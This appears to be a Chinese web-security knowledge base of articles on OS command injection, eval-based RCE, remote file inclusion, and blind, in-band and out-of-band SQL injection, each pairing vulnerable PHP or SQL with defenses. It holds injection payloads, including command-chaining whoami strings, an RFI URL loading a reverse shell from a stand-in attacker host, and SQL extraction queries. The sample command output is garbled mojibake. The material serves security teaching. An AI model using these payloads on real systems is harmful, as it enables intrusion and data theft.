操作系统命令注入漏洞是在输入验证不充分的情况下使用此类操作系统调用函数的结果。 缺乏验证使攻击者能够将恶意命令注入用户输入，然后在主机操作系统上执行这些恶意命令。

命令注入漏洞是一种应用安全问题，可能出现在任何类型的计算机软件、几乎所有编程语言和任何平台上。 例如，您可以在路由器的嵌入式软件、用 PHP 编写的 Web 应用程序和 API、用 Python 编写的服务器端脚本、用 Java 编写的移动应用程序，甚至核心操作系统软件中发现获取命令注入漏洞。

请注意，OS 命令注入经常与远程代码执行 (RCE) 混淆，也被称为代码注入。 在 RCE 的情况下，攻击者在应用程序的语言和应用程序上下文中执行恶意代码。 在OS 系统命令注入的情况下，攻击者是在系统 shell 中执行恶意命令。 然而，一些业内人士认为操作系统命令注入是代码注入的一种。

### OS 命令注入攻击示例

下面是一个简单的 PHP 源代码示例，其中包含操作系统命令注入漏洞和包含此代码的应用程序的命令注入攻击媒介。

易受攻击的代码：
PHP 应用程序的开发人员希望用户能够在 Web 应用程序中看到 Windows ping 命令的输出。 用户需要输入 IP 地址，应用程序会向该地址发送 ICMP ping。 开发人员使用 HTTP GET 参数传递 IP 地址，然后在命令行中使用它。 不幸的是，开发人员过于信任用户并且不进行输入验证。

<font color="#e90">\\<?PHP</font> <br>
&nbsp;&nbsp;<font color="#a67f59">\\$address = \\$_GET</font>[<font color="#00dd00">"address"</font>]; <br>
&nbsp;&nbsp;<font color="#a67f59">\\$output</font> = <font color="#00dd00">shell_exec</font>(<font color="#00dd00">"ping -n 3</font> <font color="#a67f59">\\$address</font>");<br>
&nbsp;&nbsp;<font color="#00dddd">echo</font> "<font color="#00dd00">\\<pre\\></font><font color="#a67f59">$output</font><font color="#00dd00">\\</pre\\>"</font>;<br>
<font color="#e90">?\\></font>

攻击向量：
恶意攻击者通过使用以下负载操纵 GET 请求来滥用此脚本：

    http://example.com/ping.php?address=8.8.8.8%26dir

Windows 中的 & 符号是用来分隔操作系统命令。 结果，易受攻击的应用程序执行了附加命令 (dir) 并显示命令输出（目录列表）：<font color="red">ping -n 3 8.8.8.8&dir</font>

    ���� Ping 8.8.8.8 ���� 32 �ֽڵ�����:
    ����ʱ��
    ���� 8.8.8.8 �Ļظ�: �ֽ�=32 ʱ��=34ms TTL=110
    ����ʱ��
    ����ʱ��

    8.8.8.8 �� Ping ͳ����Ϣ:
        ���ݰ�: �ѷ��� = 4���ѽ��� = 1����ʧ = 3 (75% ��ʧ)��
    �����г̵Ĺ���ʱ��(�Ժ���Ϊ��λ):
        ��� = 34ms��� = 34ms��ƽ�� = 34ms
    ������ C �еľ�û�б�ǩ��
    �������к��� AAF6-8F65

    C:\\phpstudy_pro\\WWW\\DVWA-master\\vulnerabilities\\exec ��Ŀ¼

    2022/10/12  05:31    
              .
    2022/10/12  05:31    
              ..
    2022/10/12  05:31    
              help
    2022/10/12  05:31             1,839 index.php
    2022/10/12  05:31    
              source
                   1 ���ļ�          1,839 �ֽ�
                  4 ��Ŀ¼ 26,274,267,136 �����ֽ�

<br>

### OS 命令注入攻击的潜在后果

在操作系统命令注入漏洞的情况下，攻击者能够以应用程序的权限执行操作系统命令。 例如，攻击者可以安装反向 shell 并获得具有此类特权的 cmd 访问权限。 然后，他们可能能够通过使用其他漏洞来升级攻击（提高权限），这可能最终导致获得根访问权限，从而完全控制 Web 服务器操作系统。

如果成功，攻击者可能会进行以下常见攻击类型之一：

* 勒索软件或者其他恶意软件：攻击者可能会在机器上安装勒索软件，然后使用其他方法传播到受害者拥有的其他资产上。

* 窃取敏感数据：攻击者可能会使用权限提升来访问包含信用卡号等敏感数据的 SQL 数据库服务器。

* 加密货币挖掘：攻击者经常在受感染的机器上安装加密货币挖掘器。 挖矿会消耗您的计算资源，为网络犯罪分子提供进行更多恶意活动的资金。

<br>

### 如何防止Web应用中的 OS 命令注入漏洞

可以通过多种方法防止 OS 命令注入攻击来提高应用程序安全性。 最简单和最安全的方法是永远不要在 PHP 中使用 shell_exec 等调用来执行主机操作系统命令，而是使用编程语言中的等效命令。 例如，如果开发人员想在 Linux/UNIX 上使用 PHP 发送邮件，他们可能会想使用操作系统中可用的邮件命令。 实际，他们应该使用 PHP 中的 mail() 函数。

<br>

#### 禁用危险函数

Web 服务器管理员可以通过禁用潜在的危险功能（例如导致操作系统调用的功能）来提高应用程序安全性。 例如，对于 PHP，您可以通过添加以下行来配置 php.ini 文件以阻止危险函数：

    disable_functions=exec,passthru,shell_exec,system

<br>

#### 使用白名单校验来提高安全性

如果编程语言中没有等效的命令，上面的方法可能会很困难。 例如，没有直接的方法从 PHP 发送 ICMP ping 数据包。 在这种情况下，您需要在将值传递给 shell 命令之前应进行输入校验，最安全的方法是使用白名单校验。 例如，在上面显示的易受攻击的代码中，您可以检查地址变量是否为 IP 地址。 更正后的代码应该为：

<font color="#e90">\\<?PHP</font> <br>
&nbsp;&nbsp;<font color="#a67f59">\\$address = <font color="#00dd00">filter_var</font>(\\$_GET</font>[<font color="#00dd00">"address"</font>], <font color="red">FILTER_VALIDATE_IP</font>); <br>
&nbsp;&nbsp;<font color="#a67f59">\\$output</font> = <font color="#00dd00">shell_exec</font>(<font color="#00dd00">"ping -n 3</font> <font color="#a67f59">\\$address</font>");<br>
&nbsp;&nbsp;<font color="#00dddd">echo</font> "<font color="#00dd00">\\<pre\\></font><font color="#a67f59">$output</font><font color="#00dd00">\\</pre\\>"</font>;<br>
<font color="#e90">?\\></font>

检验时，请记住危险的用户输入可能来自很多地方，而不仅仅是来自 GET 和 POST 参数。 它还可以出现在 HTTP 标头、JSON 或 XML 数据以及 HTTP 请求的任何其他部分中。

<br>

#### 使用字符转义来防止 OS 命令注入

在某些语言中，您可以使用字符转义来防止命令注入攻击。 这意味着在您将用户输入发送到 OS 命令之前，内置的编程语言功能会确保转义所有潜在危险的字符。

例如，在 PHP 中，您可以使用 escapeshellarg 和 escapeshellcmd 函数进行转义。 下面是修改后的安全代码：

<font color="#e90">\\<?PHP</font> <br>
&nbsp;&nbsp;<font color="#a67f59">\\$address = \\$_GET</font>[<font color="#00dd00">"address"</font>]; <br>
&nbsp;&nbsp;<font color="#a67f59">\\$output</font> = <font color="#00dd00">shell_exec</font>(<font color="#00dd00">escapeshellcmd</font>(<font color="#00dd00">"ping -n 3</font> <font color="#a67f59">\\$address</font>"));<br>
&nbsp;&nbsp;<font color="#00dddd">echo</font> "<font color="#00dd00">\\<pre\\></font><font color="#a67f59">$output</font><font color="#00dd00">\\</pre\\>"</font>;<br>
<font color="#e90">?\\></font>


####  使用黑名单校验来提高安全性

事实上，不建议使用黑名单，因为攻击者有很多方法可以绕过它们。 但是，如果您决定使用黑名单，则必须意识到攻击者可以使用各种特殊字符来注入任意命令。 最简单和最常见的是用于 Linux 的分号 (;) 和用于 Windows 的 & 符号 (&)。 但是，上面举例的易受攻击代码，以下有效负载都可以正常工作并显示 whoami 命令的结果：

* <font color="red">address=8.8.8.8%3Bwhoami</font> (; 字符，仅限 Linux)
* <font color="red">address=8.8.8.8&26whoami</font> (& 字符，仅限 Windows)
* <font color="red">address=8.8.8.8%7Cwhoami</font> (| 字符)
* <font color="red">address=invalid%7C%7Cwhoami</font> (|| 字符, 仅当第一个命令失败时才执行第二个命令)
* <font color="red">address=8.8.8.8&26&26whoami</font> (&& 字符)
* <font color="red">%3E(whoami)</font> (> 字符, 仅限Linux)
* <font color="red">%60whoami%60</font> (\` 字符, 仅限Linux, 结果是 ping 命令报告为错误)

因此，如果确实需要使用黑名单，则必须对以下特殊字符进行过滤或转义：

* Windows:  <font color="red">( ) < > & * ‘ | = ? ; [ ] ^ ~ ! . ” % @ / \\ : + , \`</font>
* Linux: <font color="red">{ } ( ) < > & * ‘ | = ? ; [ ] $ – # ~ ! . ” % / \\ : + , \`</font>

`,Bb=`---
title: 远程代码执行
date: 2026-05-08
summary: \`远程代码执行\` (RCE) 是一种漏洞，可让恶意攻击者以开发人员编写该应用程序所用的编程语言执行任意代码。 术语\`远程\`意味着攻击者可以从不同于运行应用程序的系统的位置执行此操作。 \`远程代码执行\`也称为\`代码注入\`。
tags: 漏洞库, Web安全, RCE
cover: app-yellow
readingTime: 6 分钟
featured: false
---
# 远程代码执行

### 什么是远程代码执行

\`远程代码执行\` (RCE) 是一种漏洞，可让恶意攻击者以开发人员编写该应用程序所用的编程语言执行任意代码。 术语\`远程\`意味着攻击者可以从不同于运行应用程序的系统的位置执行此操作。 \`远程代码执行\`也称为\`代码注入\`。

### 代码注入/远程代码执行如何进行

RCE 漏洞可能出现在任何类型的计算机软件、几乎所有编程语言和任何平台上。 例如，用 \`C#\`编写的独立 Windows 应用程序、用 PHP 编写的 Web 应用程序和 API、用 Java 编写的移动应用程序，甚至操作系统本身都存在 RCE 漏洞。

其他漏洞也可能导致远程任意代码执行。 例如，\`C/C++\` 等语言中的\`缓冲区溢出漏洞\`可能允许攻击者在应用程序中执行任意代码。 \`反序列化漏洞\`还可能允许攻击者提供一个负载，该负载在反序列化时包含应用程序执行的代码。 甚至还有已知的 SQL 注入和跨站点脚本 (XSS) 漏洞导致在易受攻击的应用程序中远程执行代码的案例

一些 RCE 攻击可能会延迟发生。 例如，应用程序可能首先将 RCE 负载存储在配置文件中，然后才执行它，甚至可能会执行多次。 这种类型的 RCE 漏洞称为\`存储型RCE\`。

请注意，\`RCE\`/\`代码注入\`经常与\`操作系统命令注入\`相混淆。 在 RCE 的情况下，执行的代码使用应用程序的语言并且在应用程序上下文中运行。 对于\`操作系统命令注入\`，攻击者执行的是操作系统命令。 

### Web 应用程序中的 RCE 漏洞

Web 开发中使用的每种常见编程语言都具有在运行时执行该语言代码的功能。 每当开发人员在 Web 应用程序中使用此类功能时，他们就会引入 Web 服务器端远程代码执行的可能性。 PHP 和 JavaScript 中此类函数的一个典型例子 \`eval\`。

如果开发人员允许诸如 \`eval\` 之类的函数处理未经过滤的用户输入，则恶意攻击者可能能够通过将代码包含在用户输入中来注入代码。 用户可控输入的常见场景包括 **Web 表单的文本**、**HTTP 标头的内容**、**用户上传的文件**，甚至是修改过的 **cookie**。

### Web 远程代码执行攻击示例

下面是一个简单的 PHP 源代码示例，其中就包含代码注入漏洞 (RCE)。

<br>

易受攻击的代码：

<font color="#a67f59">\\<?php</font> <font color="#00dddd">eval</font>(<font color="#00dd00">"echo "</font><font color="#a67f59">.$_GET</font>[<font color="#00dd00">"user"</font>].<font color="#00dd00">";"</font>); <font color="#a67f59">?\\></font>

开发人员假设用户只会提供一个有效的用户名作为 URL 的参数：

    http://www.example.com/index.php?user=admin

因此，应用程序将参数值填充到代码中，执行一下命令：

echo admin;

打印出用户名。

<br>

攻击向量
攻击者可以通过输入分号后跟有效负载来注入恶意代码。 分号使 \`eval\` 函数处理剩余的有效负载，就好像它是 PHP 中的新指令一样：

    http://www.example.com/index.php?user=admin;phpinfo();

结果，eval 函数执行代码：

    echo admin;
    phpinfo();

### Web RCE 攻击的潜在后果

远程代码执行是最严重的漏洞之一，因为 RCE 攻击的后果几乎是无限的，尤其是在 Web 应用程序的情况下。

攻击者利用 web RCE 漏洞进行的进一步最常见方式是安装 web shells。 这样的 RCE 漏洞有效载荷允许攻击者获得目标机器上的 shell 访问权限以运行系统命令。 该shell可能是一个反向shell，它能使攻击者避开大多数防火墙。

Web shell 具有与 Web 服务器相同的权限，通常是有限的。 然而，一旦攻击者获得了远程机器上的 shell 的访问权限，他们可能会尝试寻找其他漏洞并使用权限提升（privilege elevation）来获得 root 访问权限。

如果成功，攻击者将可以无限制地访问目标机器，并可能进行以下任何常见类型的攻击：

* 勒索软件或者其他恶意软件：攻击者可能会在机器上安装勒索软件，然后使用其他方法传播到受害者拥有的其他资产上。

* 窃取敏感数据：攻击者可能会使用权限提升来访问包含信用卡号等敏感数据的 SQL 数据库服务器。

* 加密货币挖掘：攻击者经常在受感染的机器上安装加密货币挖掘器。 挖矿会消耗您的计算资源，为网络犯罪分子提供进行更多恶意活动的资金。

### 使用反向 shell 的远程代码执行 (RCE)

![](../src/RCE.png)

<br>

### 如何防御远程代码执行 (RCE)

防止 Web 应用程序中的 RCE 漏洞的完全有效的方法是避免使用易受 RCE 影响的语言函数和结构以及不受信任的数据。 例如，PHP/JavaScript 中的 eval 函数。

如果您必须对不受信任的数据（直接或间接用户输入）使用 eval 函数，并且如果没有用户输入就无法实现您的应用程序目标，那么您必须接受您的代码容易受到远程代码执行攻击的风险。 即使有最好的输入校验，攻击者也可能总能找到一种方法来通过。

您可以通过基于白名单（而非黑名单）使用适当的输入/输出数据验证和清理来最大程度地降低攻击风险并减轻其后果。虽然在这种情况下您无法完全避免 RCE 漏洞。`,Hb=`---
title: 远程文件包含
date: 2026-05-07
summary: 远程文件包含 (RFI) 是一种 Web 漏洞，可让恶意黑客强制应用程序包含从其他位置（例如，攻击者控制的服务器）导入的任意代码文件。
tags: 漏洞库, Web安全, 文件包含
cover: app-teal
readingTime: 6 分钟
featured: false
---
# 远程文件包含

### 什么是远程文件包含
远程文件包含 (RFI) 是一种 Web 漏洞，可让恶意黑客强制应用程序包含从其他位置（例如，攻击者控制的服务器）导入的任意代码文件。

<br>

### 远程文件包含如何工作
许多编程语言，包括那些在服务器端用于开发 Web 应用程序的语言，都允许开发人员包含来自其他文件的源代码。 一些用于包含源代码的函数只允许您包含本地文件，但在某些语言中，它们还允许通过 URL 包含。 例如，对于在复杂的多服务器应用程序中包含位于其他服务器上的源代码文件很有用。

这种包含通常是静态的，即文件的 URL 在源代码中定义并且不能修改。 但是，在某些应用程序中，开发人员可能希望从远程位置动态包含文件。 如果是这样，远程文件的 URL 可能会在用户输入参数中传递。

当恶意行为者可以修改用户输入以包含他们自己的远程文件时，就会发生远程文件包含漏洞。 此漏洞最常发生在使用包含表达式的旧版本 PHP 编写的应用程序和 API 中。 对于其他常见的 Web 应用程序编程语言，以类似方式包含文件需要复杂得多的编程结构。

请注意，自 2019 年 11 月发布的 PHP 7.4.0 以来，包含远程文件的功能已被弃用。

<br>

### 远程文件包含 与 本地文件包含
如果攻击者只能包含来自同一服务器的恶意文件，那就是本地文件包含 (LFI) 漏洞。 由于以下几个原因，LFI 漏洞更为常见：

- LFI 不仅包括开发人员包含源代码文件的情况，还包括攻击者可以访问他们不应访问的本地文件的所有情况。
- LFI 发生在大多数网络编程语言中，而不仅仅是 PHP，因为其他语言也允许开发人员打开和/或包含本地文件。
- 开发人员经常需要包含本地源代码或读取和显示本地文件的内容，这可能会导致 LFI。 他们很少需要包括来自远程位置的源代码，而这对于 RFI 是必需的。

本地文件包含通常也与目录遍历一起使用。 另一方面，根据定义，RFI 不能导致目录遍历，因为文件是由 URL 包含的，而不是路径/文件名。

您还可以将 RFI 视为一种类似于跨站点脚本的攻击。 在这两种情况下，易受攻击的应用程序都会从外部来源获取不受信任的代码并执行它。 但是，在 RFI 的情况下，攻击者滥用 PHP 包含机制而不是 \\<scrip\\> 标记。

<br>

### 远程文件包含攻击示例

以下是具有远程文件包含漏洞的 PHP 代码示例，以及对包含此代码的应用程序的攻击向量。

PHP 应用程序的开发人员想要包含来自另一台服务器的源代码文件，但包含的文件不是静态的。 以下是 index.php 文件中的代码片段。

<font color="#e90"><\\?PHP </font>
  <font color="#a67f59">\\$module</font> = <font color="#a67f59">\\$_GET</font>[<font color="#00dd00">"module"</font>];
  <font color="#00dddd">include</font> <font color="#a67f59">\\$module</font>;
<font color="#e90">?></font>

服务器的PHP版本：7.3.33。 php.ini 文件包含以下配置参数：

    allow_url_include = On

此参数（在 PHP 7.4.0 中已弃用）意味着 include 表达式可以解析 URL 并包含来自该 URL 的文件。

URL 直接取自 GET HTTP 请求，因此您可以包含模块 \`http://server2.example.com/welcome.php\`，如下所示：

    http://example.com/index.php?module=http://server2.example.com/welcome.php

#### 攻击向量
攻击者操纵发送到 index.php 的 GET 请求，以包含一个 URL，其中包含配置为连接到攻击者控制的服务器的 [pentest monkey 反向 shell 脚本](https://github.com/pentestmonkey/php-reverse-shell)：

    http://example.com/index.php?module=http://attacker.example2.com/php-reverse-shell.php

结果，应用程序运行反向 shell 的代码（远程代码执行），允许攻击者远程访问服务器命令行。

### 远程文件包含攻击的潜在后果
从上面的示例中可以看出，远程文件包含漏洞可能导致远程代码执行，因此攻击者可以获得对服务器的完全控制。 但是，包含的代码与Web服务器用户具有相同的执行权限，因此其访问权限受到限制。

在 RFI 攻击中，攻击者可以使用任何恶意代码，因此根据他们的意图，他们可以尝试将 RFI 升级为以下任何网络攻击场景：

- 勒索软件或其他恶意软件：攻击者可能会升级攻击以将勒索软件代理下载到机器上。 然后，这将使用其他方法传播到受害者拥有的其他资产。
- 加密货币挖掘：攻击者经常在受感染的机器上安装加密货币挖掘器。 挖矿会消耗您的计算资源，为网络犯罪分子提供进行更多恶意活动的资金。
- 窃取敏感数据：攻击者可能会升级攻击并窃取凭据以访问包含信用卡号等敏感信息的 SQL 数据库服务器。
- 后门：攻击者可能会在受害者系统上安装一个长期后门，并使用它来监视受害者的业务活动。

### 如何防止Web应用中的远程文件包含漏洞
有几种方法可以让您防止代码中的远程文件包含漏洞：

1. 完全避免在包含表达式中使用用户输入。 这意味着不仅 URL 来自直接用户输入（例如 GET/POST HTTP 参数），还意味着攻击者可以操纵的其他数据源，例如 cookie 和标头。
2. 如果您的应用程序要求您使用动态包含并且没有办法绕过它，请创建一个安全文件白名单。

注意：不要依赖黑名单、编码或输入验证/清理方法（例如过滤）来防止远程文件包含。 例如，不要试图限制或强制执行文件扩展名或阻止特殊字符序列。 攻击者有很多方法可以绕过此类过滤器。

### 如何缓解远程文件包含攻击
有两种非常有效的方法可以减轻 PHP 中的远程文件包含攻击：

请将您的 Web 服务器 PHP 升级到版本 7.4.0 或更高版本，或者请将您的 Web 服务器将指令 allow_url_include = Off 添加到 php.ini 文件。
这将使远程文件包含变得不可能，无论在 Web 服务器上运行的应用程序是由您的开发人员编写的自定义应用程序还是第三方/开源应用程序。 但是，这可能会导致某些历史应用程序无法运行。

`,Ub=`---
title: SQL盲注
date: 2026-05-05
summary: \`盲SQL注入\`是\`SQL注入\`的一种，攻击者不会收到来自被攻击数据库的明显响应，而是通过观察数据库服务器和应用程序的行为逐步重建数据库结构。 \`SQL盲注\`也称为\`推理SQL注入\`。
tags: 漏洞库, Web安全, SQL注入
cover: app-yellow
readingTime: 6 分钟
featured: false
---
# SQL盲注

### 什么是SQL盲注

\`盲SQL注入\`是\`SQL注入\`的一种，攻击者不会收到来自被攻击数据库的明显响应，而是通过观察数据库服务器和应用程序的行为逐步重建数据库结构。 \`SQL盲注\`也称为\`推理SQL注入\`。

\`SQL盲注\`有两种类型：基于\`布尔值\`和基于\`时间\`。

<br>

### SQL盲注的后果

使用盲 SQL 注入执行攻击比使用带内 SQL 注入要花费更长的时间，但可以产生相同的结果。 根据数据库服务器和应用程序的行为，攻击者可能会执行以下操作：

* 检查是否可以进行其他类型的 SQL 注入
* 获取有关数据库结构的信息
* 从数据库中取出数据

<br>

### 什么是基于布尔的SQL盲注

\`基于布尔的SQL盲注\`是\`SQL盲注\`的一种子类型，攻击者在使用布尔运算符将合法查询与恶意数据结合后观察数据库服务器和应用程序的行为。

<br>

### 基于布尔值的SQL盲注示例

例如，假设以下查询旨在显示数据库中产品的详细信息：

<font color="#00dddd">SELECT</font> * <font color="#00dddd">FROM</font> products <font color="#00dddd">WHERE</font> id = product_id

<br>

首先，恶意攻击者以合法的方式使用应用程序来发现一个现有存在的产品\`ID\`--在这个例子中，它是产品 \`42\`。然后，他们可以为 product_id 提供以下两个值：

<font color="#c92c2c">42</font> <font color="#a67f59">AND</font> <font color="#c92c2c">1</font><font color="#a67f59">=</font><font color="#c92c2c">1</font>
<br>
<font color="#c92c2c">42</font> <font color="#a67f59">AND</font> <font color="#c92c2c">1</font><font color="#a67f59">=</font><font color="#c92c2c">0</font>
<br>

如果使用简单的字符串连接在应用程序中执行此查询，则查询分别变为：

<font color="#00dddd">SELECT</font> * <font color="#00dddd">FROM</font> products <font color="#00dddd">WHERE</font> id <font color="#a67f59">=</font> <font color="#c92c2c">42</font> <font color="#a67f59">AND</font> <font color="#c92c2c">1</font><font color="#a67f59">=</font><font color="#c92c2c">1</font>
<br>
<font color="#00dddd">SELECT</font> * <font color="#00dddd">FROM</font> products <font color="#00dddd">WHERE</font> id <font color="#a67f59">=</font> <font color="#c92c2c">42</font> <font color="#a67f59">AND</font> <font color="#c92c2c">1</font><font color="#a67f59">=</font><font color="#c92c2c">0</font>
<br>

如果应用程序在每种情况下的响应行为都不同，则它很容易受到基于布尔值的盲 SQL 注入。

<br>

如果数据库服务器是 Microsoft SQL Server，攻击者现在可以为 product_id 提供以下值：

42 <font color="#a67f59">AND</font> (<font color="#00dddd">SELECT TOP</font> 1 substring(name, 1, 1)<br>
&nbsp;<font color="#00dddd">FROM</font> sysobjects<br>
&nbsp;<font color="#00dddd">WHERE</font> id=(<font color="#00dddd">SELECT TOP</font>  1 id<br>
&nbsp;&nbsp;&nbsp;<font color="#00dddd">FROM</font>  (SELECT TOP 1 id<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#00dddd">FROM</font>  sysobjects<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#00dddd">ORDER BY</font> id)<br>
&nbsp;&nbsp;&nbsp;<font color="#00dddd">AS</font> subq<br>
&nbsp;&nbsp;&nbsp;<font color="#00dddd">ORDER BY</font> id <font color="#00dddd">DESC</font>)) = 'a'<br>

因此，\`42 AND\` 后括号中的子查询检查数据库中第一个表的名称是否以字母 \`a\` 开头。 如果为true，则应用程序的响应行为将与负载 \`42 AND 1=1\` 相同。 如果为false，应用程序的行为将与负载 \`42 AND 1=0\` 相同。

<br>

攻击者可以遍历所有字母，然后继续遍历第二个字母、第三个字母等。结果，攻击者可以发现数据库结构中第一个表的全名。 然后，他们可以尝试获取有关该表结构的更多数据，最后从表中提取数据。 虽然此示例特定于 MS SQL，但其他数据库类型也存在类似的技术。

<br>

### 什么是基于时间的 SQL 盲注

\`基于时间的SQL盲注\`是\`SQL盲注\`的一种子类型，攻击者在将合法查询与导致时间延迟的SQL命令组合后观察数据库服务器和应用程序的响应行为。

<br>

### 基于时间的SQL盲注示例

假设我们有与上面示例相同的查询：

<font color="#00dddd">SELECT</font> * <font color="#00dddd">FROM</font> products <font color="#00dddd">WHERE</font> id = product_id

<br>

恶意攻击者可能会提供以下 \`product_id\` 值：

<font color="#c92c2c">42</font>; <font color="#00dddd">WAITFOR</font> DELAY <font color="#00dd00">'0:0:10'</font>

<br>

结果，查询变为：

<font color="#00dddd">SELECT</font> * <font color="#00dddd">FROM</font> products <font color="#00dddd">WHERE</font> id = <font color="#c92c2c">42</font>; <font color="#00dddd">WAITFOR</font> DELAY <font color="#00dd00">'0:0:10'</font>

<br>

如果数据库服务器是 \`Microsoft SQL Server\`，并且应用程序容易受到基于时间的SQL盲注攻击，攻击者将在应用程序中看到 \`10秒\`的延迟。

<br>

现在攻击者知道基于时间的SQL盲注是\`可能\`的，他们可以提供以下 \`product_id\`：

<font color="#c92c2c">42</font>; <font color="#00dddd">IF</font>(<font color="#00dddd">EXISTS</font>(<font color="#00dddd">SELECT TOP</font> <font color="#c92c2c">1</font> *<br>
&nbsp;<font color="#00dddd">FROM</font> sysobjects<br>
&nbsp;<font color="#00dddd">FROM</font> id=(<font color="#00dddd">SELECT TOP</font> 1 id<br>
&nbsp;&nbsp;&nbsp;<font color="#00dddd">FROM</font> (<font color="#00dddd">SELECT TOP</font> 1 id <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#00dddd">FROM</font> sysobjects<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#00dddd">ORDER BY</font> id)<br>
&nbsp;&nbsp;&nbsp;<font color="#00dddd">AS</font> subq<br>
&nbsp;&nbsp;&nbsp;<font color="#00dddd">ORDER BY</font> id <font color="#00dddd">DESC</font>)<br>
&nbsp;<font color="#a67f59">AND</font> ascii(lower(substring(name, <font color="#c92c2c">1</font>, <font color="#c92c2c">1</font>))) = 'a'))<br>
&nbsp;<font color="#00dddd">WAITFOR</font> DELAY <font color="#00dd00">'0:0:10'</font><br>

如果数据库结构中第一个表的名称以字母\`a\`开头，则此查询的第二部分将为\`真\`，应用程序将延迟\`10秒\`做出反应。 就像上面的基于布尔的盲SQL注入一样，攻击者可以重复使用这种方法来发现数据库结构中第一个表的名称，然后尝试获取有关该表的表结构的更多数据，最后从表中提取数据。

`,zb=`---
title: 带内SQL注入
date: 2026-05-04
summary: \`带内SQL注入\`是SQL注入的一种，攻击者使用相同的通信通道接收结果作为直接响应。 例如，如果攻击者使用网络浏览器手动执行攻击，则攻击结果将显示在同一个网络浏览器中。 \`带内SQL注入\`也称为\`经典SQL注入\`。
tags: 漏洞库, Web安全, SQL注入
cover: app-teal
readingTime: 6 分钟
featured: false
---
# 带内SQL注入

### 什么是带内SQL注入

\`带内SQL注入\`是SQL注入的一种，攻击者使用相同的通信通道接收结果作为直接响应。 例如，如果攻击者使用网络浏览器手动执行攻击，则攻击结果将显示在同一个网络浏览器中。 \`带内SQL注入\`也称为\`经典SQL注入\`。

<br>

### 带内SQL注入示例

最简单的\`带内SQL注入\`类型是攻击者能够修改原始查询并接收修改后的查询的直接结果。 例如，假设以下查询旨在返回当前用户的个人数据并将其返回在响应上。

<font color="#00dddd">SELECT</font> * <font color="#00dddd">FROM</font> users <font color="#00dddd">WHERE</font> user_id <font color="#00dddd">LIKE</font> <font color="#00dd00">'current_user'</font>

<br>

如果使用简单的字符串连接在应用程序中执行此查询，则恶意攻击者可以提供以下 \`current_user\`：

%'--

<br>

结果，发送到数据库的查询字符串将变为：

<font color="#00dddd">SELECT</font> * <font color="#00dddd">FROM</font> users <font color="#00dddd">WHERE</font> user_id <font color="#00dddd">LIKE</font> <font color="#00dd00">'%'</font><font color="#6b7782">--'</font>

<br>

单引号补全 SQL 语句，双破折号 (--) 表示该行的其余部分被视为注释。 因此，应用程序执行以下查询：

<font color="#00dddd">SELECT</font> * <font color="#00dddd">FROM</font> users <font color="#00dddd">WHERE</font> user_id <font color="#00dddd">LIKE</font> <font color="#00dd00">'%'</font>

<br>

SQL 中的\`%\`是一个通配符，因此攻击的结果：应用程序将显示整个用户表（个人数据）的内容，而不仅仅是单个用户记录。

<br>

### 什么是基于错误的SQL注入

\`基于错误的SQL注入\`是\`带内SQL注入\`的一种子类型，其中返回给攻击者的结果是数据库错误字符串。

### 基于错误的SQL注入的后果

向攻击者返回错误字符串似乎无害。 但是，根据应用程序的结构和数据库的类型，攻击者可能会使用收到的错误字符串来：

* 获取有关数据库类型和版本的信息，以便针对特定数据库类型/版本使用不同的攻击技术。
* 获取有关数据库结构的信息，以便在知道结构后尝试更具体的 SQL 注入。
* 从数据库中获取数据。 虽然该过程比直接显示查询结果要长得多且复杂得多，但攻击者可能能够操纵错误以从数据库中窃取数据。

<br>

### 基于错误的SQL注入示例

假设我们有下面的查询：

<font color="#00dddd">SELECT</font> * <font color="#00dddd">FROM</font> users <font color="#00dddd">WHERE</font> user_id = <font color="#00dd00">'current_user'</font>

<br>

恶意攻击者可能会提供以下 \`current_user\` 值：

1'

<br>

结果，查询变为：

<font color="#00dddd">SELECT</font> * <font color="#00dddd">FROM</font> users <font color="#00dddd">WHERE</font> user_id = <font color="#00dd00">'1'</font>'

<br>

查询末尾的双单引号导致数据库报错。 如果 Web 服务器配置为在响应上显示错误，攻击者可能会看到如下消息：

   You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1

<br>

结果，攻击者发现该应用程序正在使用 MySQL 数据库，就可以专注于针对 MySQL 的攻击。

<br>

### 什么是基于联合的SQL注入

\`基于联合的SQL注入\`是\`带内SQL注入\`的一种子类型，攻击者使用 UNION SQL 子句将合法信息与敏感数据组合在一起进行注入查询的结果。

<br>

### 基于联合的SQL注入的后果

\`基于联合的SQL注入\`是\`最危险\`的 SQL 注入类型，因为它可以让攻击者直接从数据库中获取几乎所有信息。

<br>

### 基于联合的SQL注入示例

假设我们有下面的查询：

<font color="#00dddd">SELECT</font> * <font color="#00dddd">FROM</font> users <font color="#00dddd">WHERE</font> user_id = <font color="#00dd00">'current_user'</font>

<br>

恶意攻击者可能会提供以下 \`current_user\`：

-1' UNION SELECT version(),current_user()--'

<br>

结果，查询变为：

<font color="#00dddd">SELECT</font> * <font color="#00dddd">FROM</font> users <font color="#00dddd">WHERE</font> user_id = <font color="#00dd00">'-1'</font> <font color="#00dddd">UNION SELECT</font> version(),<font color="#00dddd">current_user</font>()--'

<br>

MySQL 中的 version 和 current_user 函数返回数据库版本和当前操作系统用户的名称。 结果，攻击者收到以下信息：

    5.5.54-0+deb8u1-log
    mysql@localhost

<br>

攻击者立即知道该应用程序在操作系统 debian 8 上使用 MySQL 5.5.54 数据库，并且使用操作系统用户帐户 mysql 访问该数据库。





`,Wb=`---
title: 带外SQL注入
date: 2026-05-03
summary: 带外SQL注入（OOB SQLi）是SQL注入的一种，攻击者不会在同一通信通道上收到来自受攻击应用程序的响应，而是能够使应用程序将数据发送到远程端点，远程端点由攻击者控制。
tags: 漏洞库, Web安全, SQL注入
cover: app-blue
readingTime: 6 分钟
featured: false
---
# 带外SQL注入

### 什么是带外SQL注入

带外SQL注入（OOB SQLi）是SQL注入的一种，攻击者不会在同一通信通道上收到来自受攻击应用程序的响应，而是能够使应用程序将数据发送到远程端点，远程端点由攻击者控制。

带外 SQL 注入仅在您使用的服务器具有触发 DNS 或 HTTP 请求的命令时才有可能。 然而，所有流行的SQL服务器都是这种情况。

<br>

### 带外SQL注入示例

#### In MySQL

